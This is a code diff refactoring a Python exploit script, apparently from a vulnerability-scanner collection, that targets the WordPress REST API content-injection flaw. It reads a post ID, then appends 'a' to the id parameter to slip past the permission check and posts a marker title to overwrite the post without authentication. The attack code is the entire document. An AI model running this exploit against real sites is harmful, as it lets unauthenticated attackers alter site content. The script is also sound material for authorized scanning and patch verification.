@@ -10,14 +10,7 @@ import sys
 import json
 import requests
 import warnings
-
-
-
-class restapi_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['wordpress rest api权限失效导致内容注入','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -27,12 +20,12 @@ class restapi_sqli:
             "Content-Type":"application/json"
         }
         payload = "/index.php/wp-json/wp/v2/posts"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             d = json.loads(req.text)
             id_code = d[0]['id']
-            vulnurl = self.url + "/index.php/wp-json/wp/v2/posts/"+str(id_code)+"?id="+str(id_code)+"a"
+            vulnurl = url + "/index.php/wp-json/wp/v2/posts/"+str(id_code)+"?id="+str(id_code)+"a"
             post_data = {
                 "title":"81dc9bdb52d04dc20036dbd8313ed055"
             }
@@ -52,5 +45,5 @@ class restapi_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = restapi_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
